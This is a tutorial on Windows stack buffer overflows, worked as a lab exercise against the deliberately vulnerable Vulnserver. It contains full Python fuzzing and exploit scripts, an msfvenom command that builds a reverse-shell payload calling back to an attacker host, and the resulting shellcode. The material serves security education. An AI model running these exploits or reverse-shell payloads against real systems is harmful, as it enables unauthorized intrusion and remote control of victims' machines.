# Buffer Overflow

Hello everyone! This Buffer Overflow documentation provides the complete demonstration, understanding and the scripts necessary for buffer overflow exploitation.

## Introduction

**What is buffer?**

1. A buffer is an area in the computer RAM reserved for temporary data storage. Data such as: User input, Parts of a video file, Server banners received by a client application
2. **Buffers are stored in a stack (LIFO)**

A **buffer overflow** occurs when **more data is put into a fixed-length buffer** than the buffer can handle.

**Buffer Overflow Attack**: Overwriting the return address value of the stack which is intended to return CPU to the next instruction in main following the function call.

## Tools Needed

1. A Windows machine (preferably Windows 10)
2. Kali Linux
3. [Vulnserver](http://www.thegreycorner.com/2010/12/introducing-vulnserver.html) installed on your Windows machine
4. [Immunity Debugger](https://www.immunityinc.com/products/debugger/) installed on your Windows machine
5. [Mona Modules](https://github.com/corelan/mona) installed in your Immunity Debugger folder

## Memory Stack

The stack grows from high address(0xffffffff) to low address(0x00000000).

Say you have 32 gb of RAM, so 2^32 addresses will be available.

![Unknown.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Unknown.png)

**Kernel** → When **system** boots, then memory will filled by device drivers.

**Stack** holds the **local** **variables for each of your functions**. When you call a new function for example printf and then some parameters - that gets put on the end of the stack.

**Heap** → Big area of memory that you can allocate huge chunks, dynamic memory allocation. *Heap grows in the up direction & stack grows in the downward direction.* 

**Data** → initialised/**uninitialised(BSS segment)** variables get held here.

**Text** → Actual **code** of our programme (exe file), read-only. 

- Global variables are stored in data segment.
- Local variables & ptr are stored in stack. ptr will be in stack but its data will be stored in heap.
- Static & uninitialised variables are stored in BSS segment.

 

**Registers**

1. **stack pointer (ESP)**: register containing the address of the **top** of the stack.
2. **base pointer (EBP)**: register containing the address of the **bottom** of the stack frame.
3. **instruction pointer (EIP):** register containing the **address of the instruction** to be executed.

## Anatomy of Stack

When we look into the memory stack, we will find 4 main components:

1. Extended Stack Pointer (ESP)
2. Buffer Space
3. Extended Base Pointer (EBP)
4. Extended Instruction Pointer (EIP) / Return Address

![1-1024x373-1-768x280.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/1-1024x373-1-768x280.png)

Buffer space is used as a storage area for memory in some coding languages. With proper input sanitation, information placed into the buffer space should never travel outside of the buffer space itself.

![2.jpeg](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/2.jpeg)

In the above example, you can see that a a number of A’s (x41) were sent to the buffer space, but were correctly sanitized. The A’s did not escape the buffer space and thus, no buffer overflow occurred.

![3.jpeg](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/3.jpeg)

Now, the A’s have completely escaped the buffer space and have actually reached the EIP. This is an example of a buffer overflow and how poor coding can become dangerous. If an attacker can gain control of the EIP, he or she can use the pointer to point to malicious code and gain a reverse shell.

## Steps to conduct a buffer overflow attack

1. Spiking
2. Fuzzing
3. Finding the Offset
4. Overwriting the EIP
5. Finding Bad Characters
6. Finding the Right Module
7. Generating Shellcode
8. Root!

## 1. Spiking

Spiking is done to **figure out what is vulnerable**. We can use a tool called **“generic_send_tcp”** to generate TCP connections with the vulnerable application.

***First, run vulnserver & immunity debugger as administrator on windows machine.***

***Connect to the vulnserver through Netcat & find out how the application responds.***

```bash
nc -nv 172.16.244.131 9999
```

![Screenshot 2021-12-22 at 12.05.59 PM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-22_at_12.05.59_PM.png)

*Windows machine IP: 172.16.244.131*

```bash
# stats.spk
s_readline();
s_string("STATS ");
s_string_variable("0");
```

```bash
# trun.spk
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

```bash
# generic_send_tcp host port **spike_script** SKIPVAR SKIPSTR

generic_send_tcp 172.16.244.131 9999 **stats.spk** 0 0
```

So during spiking, in `.spk` script, we have to try all commands and check at which command the application crashes. In this case, it came out to be TRUN command and `.spk` script at which the application is crashing.

![Screenshot 2021-12-22 at 12.17.48 PM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-22_at_12.17.48_PM.png)

As we can see, we have overwritten everything i.e. ESP, EBP & EIP. 

*EIP is the important factor.*

![Screenshot 2021-12-22 at 12.19.47 PM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-22_at_12.19.47_PM.png)

## 2. Fuzzing

**Fuzzing allows us to send bytes of data to a vulnerable program (in our case, vulnserver) in growing iterations, in hopes of overflowing the buffer space and overwriting the EIP.**

Simple python fuzzing script (1.py)

```python
#!/usr/bin/python
import sys, socket
from time import sleep

**# Sets the variable “buffer” equal to 100 A’s.**
buffer = "A" * 100

while True:
        try:
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('172.16.244.131',9999))
                
								**# Attacking TRUN command**
                s.send(('TRUN /.:/' + buffer))
                s.close()
                sleep(1) ***# Go to sleep for a second***
                buffer = buffer + "A"*100 ***# Append buffer another 100 A's***
        except:
                print "Fuzzing crashed at %s bytes" % str(len(buffer))
                sys.exit()
```

***Performs a while loop, sending each increasing iteration of A’s to Vulnserver and stopping when Vulnserver crashes.***

- *Another fuzzing script  `python3 fuzzer.py`*
    
    ```python
    #!/usr/bin/env python3
    
    import socket, time, sys
    
    ip = "MACHINE_IP"
    
    port = 1337
    timeout = 5
    prefix = "OVERFLOW1 "
    
    string = prefix + "A" * 100
    
    while True:
      try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s.settimeout(timeout)
          s.connect((ip, port))
          s.recv(1024)
          print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
          s.send(bytes(string, "latin-1"))
          s.recv(1024)
      except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
      string += 100 * "A"
      time.sleep(1)
    ```
    

```bash
chmod +x 1.py
./1.py
```

![Screenshot 2021-12-23 at 1.41.21 PM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-23_at_1.41.21_PM.png)

After this script execution, the program crashes, and roughly we know at how many bytes does the program crashed.

![Screenshot 2021-12-23 at 1.40.56 PM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-23_at_1.40.56_PM.png)

***In some instances, Vulnserver will not crash, but Immunity will pause, which indicates a crash. In this instance, you may have to hit “Ctrl + C” to stop the fuzzing script.***

## 3. Finding the offset

So, now that we know we can overwrite the EIP and that the overwrite occurred between 1 and 2900 bytes (let’s use 3,000)

```bash
/usr/share/metasploit-framework/tools/exploit/**pattern_create.rb** -l 3000
# defining length equals 3000 because our program crashed around 2900 bytes. 
```

**Pattern Create** allows us to generate a ***cyclical amount of bytes***, based on the number of bytes we specify. 

We can then send those bytes to Vulnserver, instead of A’s, and try to **find exactly where we overwrote the EIP. *Pattern Offset will help us determine that soon.***

![Screenshot 2021-12-23 at 2.02.44 PM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-23_at_2.02.44_PM.png)

Finding the offset script (2.py)

```python
#!/usr/bin/python
import sys, socket

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('172.16.244.131',9999))
        s.send(('TRUN /.:/' + offset))
        s.close

except:
        print "Error connecting to the server"
        sys.exit()
```

```bash
chmod +x 2.py
./2.py
```

![Screenshot 2021-12-23 at 2.10.19 PM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-23_at_2.10.19_PM.png)

After running this script, the program crashed and we got this in EIP:

![Screenshot 2021-12-23 at 2.10.58 PM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-23_at_2.10.58_PM.png)

so we now need to find that this value (386F4337) is exactly where in our pattern, it will indicate offset value. For that, we will be using “pattern_offset.rb”

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
# “q” is our EIP value
```

As you can see, an exact match was found at 2003 bytes

![Screenshot 2021-12-23 at 2.15.12 PM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-23_at_2.15.12_PM.png)

## 4. Overwriting the EIP

Now that we know the EIP is after 2003 bytes, we can modify our code ever so slightly to confirm our control.

```python
***# 3.py***

#!/usr/bin/python
import sys, socket

**shellcode = "A" * 2003 + "B" * 4**

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('172.16.244.131',9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close

except:
        print "Error connecting to the server"
        sys.exit()
```

Sending 2003 A’s in an attempt to reach, but not overwrite, the EIP. Then we are sending four B’s, which should overwrite the EIP with 42424242.

![Screenshot 2021-12-23 at 3.50.41 PM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-23_at_3.50.41_PM.png)

## 5. Finding Bad Characters

A bad character is essentially a rundown of **undesirable characters that can break the shellcodes.** There is no universal arrangement of bad characters. Thusly, we should discover the bad characters in each application before composing the shellcode.

By default, the null byte(x00) is always considered a bad character.

```python
#!/usr/bin/python
import sys, socket

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A" * 2003 + "B" * 4 + badchars

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('172.16.244.131',9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close

except:
        print "Error connecting to the server"
        sys.exit()
```

Once we fire this script and program crashes, we need to right-click the ESP and “Follow in DUMP“ and then look at it carefully that what characters looks out of the place.

Luckily for us, there are no bad characters in the Vulnserver program.

## 6. Finding the right module

Finding the right module means we need to find some part of Vulnserver that does not have any sort of memory protections.

`**!mona modules**`

![Screenshot 2021-12-24 at 6.11.28 AM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-24_at_6.11.28_AM.png)

What we’re looking for is “False” across the board, preferably. That means there are no memory protections present in the module.

`essfunc.dll` is running as part of Vulnserver and has no memory protections.

What we need to do now is find the opcode equivalent of JMP ESP. We are using JMP ESP because **our EIP will point to the JMP ESP location, which will jump to our malicious shellcode** that we will inject later. 

Finding the opcode equivalent means we are converting assembly language into hexcode. There is a tool to do this called `nasm_shell`.

![Screenshot 2021-12-24 at 6.24.24 AM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-24_at_6.24.24_AM.png)

Our JMP ESP opcode equivalent is “FFE4”.

**The pointer address is what we will place into the EIP to point to our malicious shellcode.**

**In Immunity searchbar, type:**

```python
!**mona** find -s "\xff\xe4" -m essfunc.dll
```

![Screenshot 2021-12-24 at 6.33.50 AM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-24_at_6.33.50_AM.png)

We have just generated is a list of addresses that we can potentially use as our pointer.

I am going to select the first address, **0x625011af**.

```python
#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + **"\xaf\x11\x50\x62"**

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('172.16.244.131',9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close

except:
        print "Error connecting to the server"
        sys.exit()
```

Return address was entered backwards. This is actually called Little Endian. 

We have to use the Little Endian format in x86 architecture because the low-order byte is stored in the memory at the lowest address and the high-order byte is stored at the highest address.

We need to test out our return address. Again, with a freshly attached Vulnserver, we need to find our return address in Immunity Debugger. To do this, click on the far right arrow on the top panel of Immunity:

![23.jpg](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/23.jpg)

search for “625011AF”. That should bring up your return address, FFE4, JMP ESP location. Once you’ve found it, hit F2 and the address should turn baby blue, indicating that we have set a breakpoint.

![Screenshot 2021-12-24 at 6.53.40 AM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-24_at_6.53.40_AM.png)

Now, execute your code **mona_code.py** and see if the breakpoint triggers.

![Screenshot 2021-12-24 at 7.03.53 AM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-24_at_7.03.53_AM.png)

![Screenshot 2021-12-24 at 7.04.22 AM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-24_at_7.04.22_AM.png)

## 7. Generating Shellcode and Gaining Shells

```python
msfvenom -p windows/shell_reverse_tcp LHOST=172.16.244.128 LPORT=5656 EXITFUNC=thread -f c -a x86 -b "\x00"
```

flags:

`EXITFUNC=thread` adds stability to our payload

`-f` is file type in format c

`-a` is for arch which is x86

`-b` is for defining bad characters

Put this in python script:

![Screenshot 2021-12-24 at 7.11.20 AM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-24_at_7.11.20_AM.png)

 

```python
#!/usr/bin/python
import sys, socket

overflow = (
"\xb8\x7b\x1c\xc0\xb3\xda\xc6\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x31\x43\x12\x03\x43\x12\x83\xb8\x18\x22\x46\xc2\xc9\x20"
"\xa9\x3a\x0a\x45\x23\xdf\x3b\x45\x57\x94\x6c\x75\x13\xf8\x80"
"\xfe\x71\xe8\x13\x72\x5e\x1f\x93\x39\xb8\x2e\x24\x11\xf8\x31"
"\xa6\x68\x2d\x91\x97\xa2\x20\xd0\xd0\xdf\xc9\x80\x89\x94\x7c"
"\x34\xbd\xe1\xbc\xbf\x8d\xe4\xc4\x5c\x45\x06\xe4\xf3\xdd\x51"
"\x26\xf2\x32\xea\x6f\xec\x57\xd7\x26\x87\xac\xa3\xb8\x41\xfd"
"\x4c\x16\xac\x31\xbf\x66\xe9\xf6\x20\x1d\x03\x05\xdc\x26\xd0"
"\x77\x3a\xa2\xc2\xd0\xc9\x14\x2e\xe0\x1e\xc2\xa5\xee\xeb\x80"
"\xe1\xf2\xea\x45\x9a\x0f\x66\x68\x4c\x86\x3c\x4f\x48\xc2\xe7"
"\xee\xc9\xae\x46\x0e\x09\x11\x36\xaa\x42\xbc\x23\xc7\x09\xa9"
"\x80\xea\xb1\x29\x8f\x7d\xc2\x1b\x10\xd6\x4c\x10\xd9\xf0\x8b"
"\x57\xf0\x45\x03\xa6\xfb\xb5\x0a\x6d\xaf\xe5\x24\x44\xd0\x6d"
"\xb4\x69\x05\x21\xe4\xc5\xf6\x82\x54\xa6\xa6\x6a\xbe\x29\x98"
"\x8b\xc1\xe3\xb1\x26\x38\x64\x12\xa6\xb6\xf4\x02\xc5\x36\xe3"
"\xca\x40\xd0\x61\xfb\x04\x4b\x1e\x62\x0d\x07\xbf\x6b\x9b\x62"
"\xff\xe0\x28\x93\x4e\x01\x44\x87\x27\xe1\x13\xf5\xee\xfe\x89"
"\x91\x6d\x6c\x56\x61\xfb\x8d\xc1\x36\xac\x60\x18\xd2\x40\xda"
"\xb2\xc0\x98\xba\xfd\x40\x47\x7f\x03\x49\x0a\x3b\x27\x59\xd2"
"\xc4\x63\x0d\x8a\x92\x3d\xfb\x6c\x4d\x8c\x55\x27\x22\x46\x31"
"\xbe\x08\x59\x47\xbf\x44\x2f\xa7\x0e\x31\x76\xd8\xbf\xd5\x7e"
"\xa1\xdd\x45\x80\x78\x66\x65\x63\xa8\x93\x0e\x3a\x39\x1e\x53"
"\xbd\x94\x5d\x6a\x3e\x1c\x1e\x89\x5e\x55\x1b\xd5\xd8\x86\x51"
"\x46\x8d\xa8\xc6\x67\x84")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('172.16.244.131',9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close

except:
        print "Error connecting to the server"
        sys.exit()
```

![Screenshot 2021-12-24 at 7.17.18 AM.png](Buffer%20Overflow%20fbe336119c0d40d9bcfb6d3c5fa8aee4/Screenshot_2021-12-24_at_7.17.18_AM.png)

---
